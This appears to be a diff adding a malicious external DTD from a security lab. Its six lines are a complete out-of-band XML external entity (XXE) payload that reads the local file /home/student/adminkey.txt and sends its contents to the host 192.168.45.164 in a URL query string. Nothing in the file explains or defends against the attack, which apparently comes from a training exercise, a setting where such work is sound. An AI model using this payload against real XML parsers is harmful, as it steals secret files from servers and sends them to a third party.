@@ -1,0 +1,6 @@
+
+            <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt">
+            <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.45.164/?x=%file;'>">
+            %eval;
+            %exfiltrate;
+            
